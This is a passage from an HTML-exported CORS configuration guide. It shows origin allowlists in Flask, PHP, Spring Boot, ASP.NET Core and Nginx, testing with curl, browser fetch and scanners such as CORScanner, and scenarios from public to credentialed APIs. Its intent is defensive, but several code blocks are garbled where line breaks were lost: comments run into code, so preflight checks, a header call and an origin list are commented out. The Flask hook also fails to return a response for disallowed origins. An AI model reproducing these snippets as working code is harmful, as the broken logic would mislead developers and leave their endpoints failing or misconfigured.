+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8023-bd1b-f6667a87fa81" class=""><strong>Python/Flask (Manual Implementation)</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80b3-bf6b-fb4ae2818cbc" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from flask import Flask, request, jsonify, make_response
+
+app = Flask(__name__)
+
+ALLOWED_ORIGINS = [
+    &#x27;https://example.com&#x27;,
+    &#x27;https://app.example.com&#x27;
+]
+
+@app.after_request
+def after_request(response):
+    origin = request.headers.get(&#x27;Origin&#x27;)
+
+    if origin and origin in ALLOWED_ORIGINS:
+        response.headers[&#x27;Access-Control-Allow-Origin&#x27;] = origin
+        response.headers[&#x27;Access-Control-Allow-Credentials&#x27;] = &#x27;true&#x27;
+        response.headers[&#x27;Access-Control-Allow-Methods&#x27;] = &#x27;GET, POST, PUT, DELETE&#x27;
+        response.headers[&#x27;Access-Control-Allow-Headers&#x27;] = &#x27;Content-Type, Authorization&#x27;
+        response.headers[&#x27;Access-Control-Max-Age&#x27;] = &#x27;86400&#x27;
+
+# Handle preflightif request.method == &#x27;OPTIONS&#x27;:
+        return response
+
+    return response
+
+@app.route(&#x27;/api/data&#x27;)
+def get_data():
+    return jsonify({&#x27;data&#x27;: &#x27;value&#x27;})
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-809b-a3ac-cabdca016d6e" class=""><strong>PHP</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80fc-aebb-d03094744635" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&lt;?php
+$allowedOrigins = [
+    &#x27;https://example.com&#x27;,
+    &#x27;https://app.example.com&#x27;
+];
+
+$origin = $_SERVER[&#x27;HTTP_ORIGIN&#x27;] ?? &#x27;&#x27;;
+
+if (in_array($origin, $allowedOrigins)) {
+    header(&quot;Access-Control-Allow-Origin: $origin&quot;);
+    header(&#x27;Access-Control-Allow-Credentials: true&#x27;);
+    header(&#x27;Access-Control-Allow-Methods: GET, POST, PUT, DELETE&#x27;);
+    header(&#x27;Access-Control-Allow-Headers: Content-Type, Authorization&#x27;);
+    header(&#x27;Access-Control-Max-Age: 86400&#x27;);
+}
+
+// Handle preflightif ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;OPTIONS&#x27;) {
+    http_response_code(200);
+    exit;
+}
+
+// Your API codeheader(&#x27;Content-Type: application/json&#x27;);
+echo json_encode([&#x27;data&#x27; =&gt; &#x27;value&#x27;]);
+?&gt;
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-809f-a75e-c823f7851587" class=""><strong>Java/Spring Boot</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80e6-a26d-cd1289efc8e1" class="code code-wrap"><code class="language-Java" style="white-space:pre-wrap;word-break:break-all">import org.springframework.web.bind.annotation.*;
+import org.springframework.web.servlet.config.annotation.CorsRegistry;
+import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;
+
+@Configuration
+public class CorsConfig implements WebMvcConfigurer {
+
+    @Override
+    public void addCorsMappings(CorsRegistry registry) {
+        registry.addMapping(&quot;/api/**&quot;)
+            .allowedOrigins(&quot;https://example.com&quot;, &quot;https://app.example.com&quot;)
+            .allowedMethods(&quot;GET&quot;, &quot;POST&quot;, &quot;PUT&quot;, &quot;DELETE&quot;)
+            .allowedHeaders(&quot;Content-Type&quot;, &quot;Authorization&quot;)
+            .allowCredentials(true)
+            .maxAge(86400);
+    }
+}
+
+@RestController
+@RequestMapping(&quot;/api&quot;)
+public class ApiController {
+
+    @GetMapping(&quot;/data&quot;)
+    public ResponseEntity&lt;?&gt; getData() {
+        return ResponseEntity.ok(Map.of(&quot;data&quot;, &quot;value&quot;));
+    }
+}
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8074-866d-ee64d753970d" class=""><strong>C#/ASP.NET Core</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8076-9997-c660aa944a1b" class="code code-wrap"><code class="language-C#" style="white-space:pre-wrap;word-break:break-all">using Microsoft.AspNetCore.Builder;
+using Microsoft.AspNetCore.Http;
+
+public class Startup
+{
+    public void ConfigureServices(IServiceCollection services)
+    {
+        services.AddCors(options =&gt;
+        {
+            options.AddPolicy(&quot;AllowSpecificOrigins&quot;, policy =&gt;
+            {
+                policy.WithOrigins(&quot;https://example.com&quot;, &quot;https://app.example.com&quot;)
+                      .AllowCredentials()
+                      .AllowAnyMethod()
+                      .AllowAnyHeader()
+                      .SetPreflightMaxAge(TimeSpan.FromDays(1));
+            });
+        });
+    }
+
+    public void Configure(IApplicationBuilder app)
+    {
+        app.UseCors(&quot;AllowSpecificOrigins&quot;);
+// ... other middleware
+    }
+}
+
+[ApiController]
+[Route(&quot;api&quot;)]
+public class ApiController : ControllerBase
+{
+    [HttpGet(&quot;data&quot;)]
+    public IActionResult GetData()
+    {
+        return Ok(new { data = &quot;value&quot; });
+    }
+}
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-803e-b579-f75ee4468c55" class=""><strong>Nginx Configuration</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-807e-8c47-dc3d8af04355" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">server {
+    listen 443 ssl;
+    server_name api.example.com;
+
+    location /api {
+# CORS headersif ($http_origin ~* ^https://(example|app)\.example\.com$) {
+            add_header &#x27;Access-Control-Allow-Origin&#x27; &#x27;$http_origin&#x27; always;
+            add_header &#x27;Access-Control-Allow-Credentials&#x27; &#x27;true&#x27; always;
+            add_header &#x27;Access-Control-Allow-Methods&#x27; &#x27;GET, POST, PUT, DELETE&#x27; always;
+            add_header &#x27;Access-Control-Allow-Headers&#x27; &#x27;Content-Type, Authorization&#x27; always;
+            add_header &#x27;Access-Control-Max-Age&#x27; &#x27;86400&#x27; always;
+        }
+
+# Handle preflightif ($request_method = &#x27;OPTIONS&#x27;) {
+            return 204;
+        }
+
+        proxy_pass http://backend;
+    }
+}
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-809d-bbd0-eadfefb89915"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-80e0-aa7b-d24429f3c560" class=""><strong>Testing CORS Configuration</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-808e-a37e-f3dd076e5a20" class=""><strong>Manual Testing with curl</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80d0-9130-e324065eaf20" class=""><strong>Test simple request:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80a1-aa57-cb76e4843565" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">curl -H &quot;Origin: https://example.com&quot; \
+     -H &quot;Access-Control-Request-Method: GET&quot; \
+     -v https://api.example.com/data
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80da-ac4c-da6fca3fbb1e" class=""><strong>Test preflight:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80d3-9f0b-e617cdaf1dae" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">curl -X OPTIONS \
+     -H &quot;Origin: https://example.com&quot; \
+     -H &quot;Access-Control-Request-Method: POST&quot; \
+     -H &quot;Access-Control-Request-Headers: Content-Type&quot; \
+     -v https://api.example.com/data
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8058-b49b-f17da3424aaf" class=""><strong>Test with credentials:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8089-aa00-f2ba00481082" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">curl -H &quot;Origin: https://example.com&quot; \
+     -H &quot;Cookie: sessionId=abc123&quot; \
+     -v https://api.example.com/data
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80cf-bb7f-d217c9dd99a2" class=""><strong>Browser Testing</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8070-80ac-f346edb8d52d" class=""><strong>JavaScript Console:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80cb-9af4-f8c9d01c3176" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Test simple requestfetch(&#x27;https://api.example.com/data&#x27;, {
+  credentials: &#x27;include&#x27;
+})
+  .then(response =&gt; response.json())
+  .then(data =&gt; console.log(data))
+  .catch(error =&gt; console.error(&#x27;CORS error:&#x27;, error));
+
+// Test preflightfetch(&#x27;https://api.example.com/data&#x27;, {
+  method: &#x27;POST&#x27;,
+  headers: {
+    &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,
+    &#x27;X-Custom-Header&#x27;: &#x27;value&#x27;
+  },
+  body: JSON.stringify({key: &#x27;value&#x27;})
+})
+  .then(response =&gt; response.json())
+  .then(data =&gt; console.log(data))
+  .catch(error =&gt; console.error(&#x27;CORS error:&#x27;, error));
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80af-9cdf-eecf5e1de643" class=""><strong>Browser DevTools:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8007-8433-e35aecc6f87d" class="numbered-list" start="1"><li>Open Network tab</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80ea-95ca-d390b56fb63d" class="numbered-list" start="2"><li>Make request</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-800d-8f0c-f6ecc7c6eeca" class="numbered-list" start="3"><li>Check request headers (Origin)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-809b-9f0d-d2d9fa07c4af" class="numbered-list" start="4"><li>Check response headers (CORS headers)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80bf-83e1-c83b198866a9" class="numbered-list" start="5"><li>Look for CORS errors in console</li></ol></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-804c-bf68-ce37de0dee55" class=""><strong>Automated Testing Tools</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80fe-93a5-fe0d21bb707e" class=""><strong>CORScanner:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8055-a055-e446ceaecd71" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">git clone https://github.com/chenjj/CORScanner
+cd CORScanner
+python CORScanner.py -u https://api.example.com
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8055-afa1-de96b0eca3cf" class=""><strong>Burp Suite:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-805b-a77f-e734373afe63" class="numbered-list" start="1"><li>Configure proxy</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80a2-b982-f8341fc4bd02" class="numbered-list" start="2"><li>Intercept request</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80cc-aafe-ddc8cd4e67c1" class="numbered-list" start="3"><li>Modify Origin header</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8053-a92f-ec87101c2986" class="numbered-list" start="4"><li>Check response headers</li></ol></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8072-90d4-dae0248f5f18" class=""><strong>OWASP ZAP:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8038-a770-cb624b34b1f7" class="bulleted-list"><li style="list-style-type:disc">Automated CORS scanning</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8006-8c3e-c4ec6397c006" class="bulleted-list"><li style="list-style-type:disc">Identifies misconfigurations</li></ul></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-806c-8c97-f4dae40d681c"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-8082-89a4-c843f559ddc7" class=""><strong>Real-World Scenarios</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-802c-8840-d389f26ebd30" class=""><strong>Scenario 1: Public API (No Credentials)</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80fc-857b-fdefea17f8d0" class=""><strong>Requirements:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-806f-9600-df2a7fec350f" class="bulleted-list"><li style="list-style-type:disc">Public API accessible from any origin</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8076-82ef-c58ed6ec4cda" class="bulleted-list"><li style="list-style-type:disc">No authentication required</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8053-a110-cf9f1161e2cd" class="bulleted-list"><li style="list-style-type:disc">Read-only data</li></ul></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8084-8009-c62b483f2427" class=""><strong>Configuration:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80d3-abe9-e9e8fd462d07" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-808f-88f9-e71e9c04e53c" class=""><strong>Note:</strong> Wildcard is acceptable for truly public APIs without credentials.</p></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80c3-9f81-cead0669bc17" class=""><strong>Scenario 2: Authenticated API (With Credentials)</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80c6-a25f-e00ea5103069" class=""><strong>Requirements:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80e4-b4ce-f6fc9d435823" class="bulleted-list"><li style="list-style-type:disc">API requires authentication</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80f0-81a0-ce8f5a4f2999" class="bulleted-list"><li style="list-style-type:disc">Cookies or tokens sent with requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8096-b1f2-d114e5846df0" class="bulleted-list"><li style="list-style-type:disc">Specific origins only</li></ul></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8073-8e6c-fc1afdcbf8df" class=""><strong>Configuration:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-808e-8dbb-e0e03e27eafa" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Origin: https://example.com
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Headers: Content-Type, Authorization
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-804f-8679-ca0e499337ef" class=""><strong>Client:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80e7-8257-e9c87d07ee06" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">fetch(&#x27;https://api.example.com/data&#x27;, {
+  credentials: &#x27;include&#x27;,
+  headers: {
+    &#x27;Authorization&#x27;: &#x27;Bearer token123&#x27;
+  }
+});
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8035-9f78-fd12dea3853a" class=""><strong>Scenario 3: Multi-Origin Support</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8025-9196-d22a836035e6" class=""><strong>Requirements:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80de-acfb-e573b7dc855b" class="bulleted-list"><li style="list-style-type:disc">Support multiple trusted origins</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8076-bfcc-e2807141d174" class="bulleted-list"><li style="list-style-type:disc">Dynamic origin validation</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8067-9165-fc9a9f7af846" class="bulleted-list"><li style="list-style-type:disc">Credentials enabled</li></ul></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8025-808a-f3799a6597c9" class=""><strong>Configuration:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-809a-a501-cf5d67c5634d" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const allowedOrigins = [
+  &#x27;https://example.com&#x27;,
+  &#x27;https://app.example.com&#x27;,
+  &#x27;https://admin.example.com&#x27;
+];
+
+app.use((req, res, next) =&gt; {
+  const origin = req.headers.origin;
+
+  if (allowedOrigins.includes(origin)) {
+    res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, origin);
+    res.setHeader(&#x27;Access-Control-Allow-Credentials&#x27;, &#x27;true&#x27;);
+  }
+
+  next();
+});
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80bb-8a0c-e2454841b1e5" class=""><strong>Scenario 4: Development vs Production</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80aa-96fc-cb5621b27ab6" class=""><strong>Requirements:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80b2-843f-cd648778af49" class="bulleted-list"><li style="list-style-type:disc">Different CORS settings for dev/prod</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80a8-bf5f-f310a512c46f" class="bulleted-list"><li style="list-style-type:disc">Local development support</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-809d-ab83-cede5798b1a2" class="bulleted-list"><li style="list-style-type:disc">Production restrictions</li></ul></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80c0-ac25-c30aee686a8c" class=""><strong>Configuration:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8052-82a3-f6c4eb2bf869" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const isDevelopment = process.env.NODE_ENV === &#x27;development&#x27;;
+
+const corsOptions = {
+  origin: (origin, callback) =&gt; {
+    if (isDevelopment) {
+// Allow localhost in developmentif (!origin || origin.startsWith(&#x27;http://localhost&#x27;)) {
+        callback(null, true);
+      } else {
+        callback(new Error(&#x27;Not allowed&#x27;));
+      }
+    } else {
+// Production: strict origin listconst allowedOrigins = [
+        &#x27;https://example.com&#x27;,
+        &#x27;https://app.example.com&#x27;
+      ];
+
+      if (allowedOrigins.includes(origin)) {
+        callback(null, true);
+      } else {
+        callback(new Error(&#x27;Not allowed&#x27;));
+      }
+    }
+  },
+  credentials: true
+};
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8048-adc4-fb8f42f869d2" class=""><strong>Scenario 5: Third-Party Widget Integration</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8030-bb72-e9515247679e" class=""><strong>Requirements:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8063-879e-e5e1c48e2c81" class="bulleted-list"><li style="list-style-type:disc">Widget embedded on third-party sites</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-809b-9df9-ead2a618373f" class="bulleted-list"><li style="list-style-type:disc">Needs to communicate with your API</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-800a-af6b-eabe302a5823" class="bulleted-list"><li style="list-style-type:disc">Secure communication</li></ul></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80c9-815b-d77daa328ef4" 